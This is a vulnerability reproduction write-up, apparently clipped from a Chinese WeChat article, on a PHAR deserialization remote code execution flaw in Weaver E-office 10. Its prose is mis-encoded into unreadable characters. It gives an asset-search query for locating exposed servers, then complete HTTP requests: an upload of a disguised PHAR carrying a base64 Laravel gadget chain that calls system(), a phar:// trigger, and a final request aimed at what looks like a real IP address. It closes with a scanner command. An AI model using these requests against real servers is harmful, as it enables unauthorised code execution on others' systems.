<meta name="referrer" content="no-referrer"/>
> æœ¬æ–‡ç”± [ç®€æ‚¦ SimpRead](http://ksria.com/simpread/) è½¬ç ï¼Œ åŸæ–‡åœ°å€ [mp.weixin.qq.com](https://mp.weixin.qq.com/s/zFQ1DZZojm3ww1jq0ReVhw)

ä¸€ã€æ¼æ´ç®€ä»‹
======

æ³›å¾® eoffice10 ååŒåŠå…¬å¹³å°æ˜¯ä¸€æ¬¾ä¸“ä¸šçš„ office åŠå…¬çš„å·¥å…·è½¯ä»¶ã€‚è½¯ä»¶æ”¯æŒåœ¨çº¿å¤šäººç¼–è¾‘æ–‡ä»¶ï¼Œå¹¶ä¸”ä¼šåœ¨ç¬¬ä¸€æ—¶é—´æ”¶å‘åä½œéœ€æ±‚ã€‚ååˆ†æ–¹ä¾¿å¿«æ·ï¼Œç•Œé¢ç®€çº¦ï¼Œå¸ƒå±€ç›´è§‚æ¸…æ™°ï¼Œæ“ä½œç®€å•ï¼Œææ˜“ä¸Šæ‰‹ï¼Œæ˜¯ä¸€æ¬¾ä¸å¯å¤šå¾—çš„åˆ©å™¨ã€‚æ³›å¾® E-office 10 å¤„ç†ä¸Šä¼ çš„ PHAR æ–‡ä»¶æ—¶å­˜åœ¨ç¼ºé™·ã€‚æ”»å‡»è€…èƒ½å¤Ÿä¸Šä¼ ä¼ªè£…çš„ PHAR æ–‡ä»¶åˆ°æœåŠ¡å™¨ï¼Œåˆ©ç”¨ PHP å¤„ç† PHAR æ–‡ä»¶æ—¶è‡ªåŠ¨è¿›è¡Œçš„ååºåˆ—åŒ–æœºåˆ¶æ¥è§¦å‘è¿œç¨‹ä»£ç æ‰§è¡Œã€‚

äºŒã€èµ„äº§æµ‹ç»˜
======

hunterï¼šweb.body="eoffice10"&&web.body="eoffice_loading_tip"

![](https://mmbiz.qpic.cn/mmbiz_jpg/SIeSFr9Ws7Gp4IVMjp3picGIEKdA9UMF9hmHjqDia0w1YMvA85YCIg2EN0EIicjuQGW58ewGIFoIz1gka90icJKr4w/640?wx_fmt=jpeg&from=appmsg)

ä¸‰ã€æ¼æ´å¤ç°
======

1ã€ç”Ÿæˆ phar æ–‡ä»¶

2ã€ä¸Šä¼  phar æ–‡ä»¶ï¼Œè·å–å›æ˜¾ä¸­ attachment_id å€¼ (æ‰§è¡Œå‘½ä»¤æ—¶éœ€è¦)

/eoffice10/server/public/api/attachment/atuh-fi

![](https://mmbiz.qpic.cn/mmbiz_png/SIeSFr9Ws7Gp4IVMjp3picGIEKdA9UMF95Bic2NPV3Vqz44KibnyTy3jSLpWra2uw5qU43qVvibcUwgPiboNibwYg2HQ/640?wx_fmt=png&from=appmsg)

ğŸ“phar.phar.zip

data éœ€è¦ base64 è§£å¯†

```
POST /eoffice10/server/public/api/attachment/atuh-file HTTP/1.1
Host: xxx
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36
Content-Length: 524
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Connection: close
Content-Type: multipart/form-data; boundary=00content0boundary00
Accept-Encoding: gzip, deflate

--00content0boundary00
Content-Disposition: form-data; 
Content-Type: image/jpeg

R0lGODlhPD9waHAgX19IQUxUX0NPTVBJTEVSKCk7ID8+DQorAQAAAQAAABEAAAABAAAAAAD9AAAATzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MjU6IklsbHVtaW5hdGVcQnVzXERpc3BhdGNoZXIiOjE6e3M6MTY6IgAqAHF1ZXVlUmVzb2x2ZXIiO3M6Njoic3lzdGVtIjt9czo4OiIAKgBldmVudCI7TzozODoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcQnJvYWRjYXN0RXZlbnQiOjE6e3M6MTA6ImNvbm5lY3Rpb24iO3M6MTI6ImVjaG8gc3RjdGVzdCI7fX0IAAAAdGVzdC50eHQEAAAARf0FZgQAAAAMfn82AQAAAAAAAHRlc3RoZA/9TR1P/f39Ef39OiT9/SP9QgIAAABHQk1C

```

![](https://mmbiz.qpic.cn/mmbiz_png/SIeSFr9Ws7Gp4IVMjp3picGIEKdA9UMF99Sd7SsPFKichuGyuadLZOWiam3gX3MxoicrBWe7PX1KYvhNwOe3JqsPzA/640?wx_fmt=png&from=appmsg)

3ã€åˆ©ç”¨ Phar:// ä¼ªåè®®è¯»å– phar æ–‡ä»¶

```
POST /eoffice10/server/public/api/attachment/path/migrate HTTP/1.1
Host: xxx
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:124.0) Gecko/20100101 Firefox/124.0
Content-Length: 69
Accept-Encoding: gzip, deflate
Connection: close
Content-Type: application/x-www-form-urlencoded

source_path=&desc_path=phar%3A%2F%2F..%2F..%2F..%2F..%2Fattachment%2F

```

4ã€é€šè¿‡ç¬¬ä¸€æ­¥è·å–çš„ id è§¦å‘æ¼æ´

```
POST /eoffice10/server/public/api/empower/import HTTP/1.1
Host: 211.142.45.227:8010
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:124.0) Gecko/20100101 Firefox/124.0
Content-Length: 47
Accept-Encoding: gzip, deflate
Connection: close
Content-Type: application/x-www-form-urlencoded

type=tttt&file=3487d6e84f8cfab81ddb05c3c403ada1

```

![](https://mmbiz.qpic.cn/mmbiz_png/SIeSFr9Ws7Gp4IVMjp3picGIEKdA9UMF9SicKAeeZAMaYfHtVu5hHGmUOULxicPeZctC7k8jwlwCbDQAq8ibRkOs0Q/640?wx_fmt=png&from=appmsg)

4ã€æ¼æ´åˆ©ç”¨
======

```
xpoc -r 421 -t http://xxx

```

![](https://mmbiz.qpic.cn/mmbiz_png/SIeSFr9Ws7Gp4IVMjp3picGIEKdA9UMF9Y1AQGWiaoETve0EsX7FePBabs8vKafboYd01rs61gv84cgWKgBDmBxQ/640?wx_fmt=png&from=appmsg)